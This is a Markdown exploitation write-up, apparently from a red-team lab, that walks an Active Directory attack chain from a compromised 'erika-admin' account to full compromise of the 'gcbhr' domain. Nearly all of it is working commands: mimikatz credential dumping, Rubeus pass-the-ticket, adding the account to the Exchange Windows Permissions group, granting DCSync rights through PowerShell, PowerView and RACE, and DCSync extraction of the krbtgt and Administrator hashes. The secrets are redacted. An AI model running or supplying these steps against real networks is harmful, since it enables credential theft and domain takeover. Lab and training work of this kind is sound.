## ATTACK CHAIN

`erika-admin` → member of `Organization Management` → `GenericAll` over `OU=Microsoft Exchange Security Groups` → group membership modification → added to `Exchange Windows Permissions` → `WriteDACL` inherited over `gcbhr.example` → replication rights assigned (`Replicating Directory Changes*`) → DCSync → `krbtgt` and `Administrator` credentials extracted → full domain compromise

## EXPLOITATION

#### 1. Credential Harvesting — Recover erika-admin Hash

```powershell
.\mimikatz.exe "privilege::debug" "token::elevate" "sekurlsa:REDACTED_SECRET" "vault:REDACTED_SECRET" "vault::cred /patch" "lsadump::secrets" "exit"

# Username : erika
# NTLM     : REDACTED_HASH
# Username : HR-ERIKA$
# NTLM     : REDACTED_HASH
# Username : erika-admin
# NTLM     : REDACTED_HASH
# Password : REDACTED_SECRET

lsadump::secrets
#  hr\erika-admin : REDACTED_SECRET
```

#### 2. Impersonate erika-admin

```powershell
.\Rubeus.exe asktgt /domain:gcbhr.example /user:erika-admin /ntlm:REDACTED_SECRET /ptt
```

> Operates in the domain under the security context of `erika-admin`.

#### 3. Privilege Escalation via Exchange Group Membership

`erika-admin` is a member of `Organization Management`, which has `GenericAll` over the Exchange OU — allowing members to be added to privileged Exchange groups such as `Exchange Windows Permissions`.

```powershell
Add-DomainGroupMember -Identity "Exchange Windows Permissions" -Members erika-admin

# Confirm
Get-ADGroupMember -Identity "Exchange Windows Permissions" | select SamAccountName
# Exchange Trusted Subsystem
# erika-admin
```

#### 4. Delegate DCSync Rights via Domain ACL Modification

```powershell
# Using Active Directory module (Exchange-style)
Add-ADPermission -Identity "DC=gcbhr,DC=local" -User hr\erika-admin -ExtendedRights "Replicating Directory Changes","Replicating Directory Changes All","Replicating Directory Changes In Filtered Set"

# Using PowerView
Add-DomainObjectAcl -TargetIdentity "DC=gcbhr,DC=local" -PrincipalIdentity hr\erika-admin -Rights DCSync -verbose

# Using RACE
Import-Module .\Microsoft.ActiveDirectory.Management.dll
Import-Module .\ActiveDirectory.psd1
Import-Module .\RACE.ps1
Set-ADACL -SamAccountName hr\erika-admin -DistinguishedName 'DC=gcbhr,DC=local' -GUIDRight DCSync -Server gcbhr.example -verbose
```

`erika-admin` now holds replication rights over the domain, enabling DCSync.

#### 5. DCSync — Full Domain Compromise

```powershell
.\mimikatz.exe "privilege::debug" "lsadump::dcsync /user:HR\krbtgt" "exit"
# USER   : krbtgt
# NTLM   : REDACTED_HASH
# aes256 : REDACTED_HASH

.\mimikatz.exe "privilege::debug" "lsadump::dcsync /user:HR\Administrator" "exit"
# USER   : ADMINISTRATOR
# NTLM   : REDACTED_HASH
# aes256 : REDACTED_HASH
```

> `gcbhr.example` is fully compromised at this point.
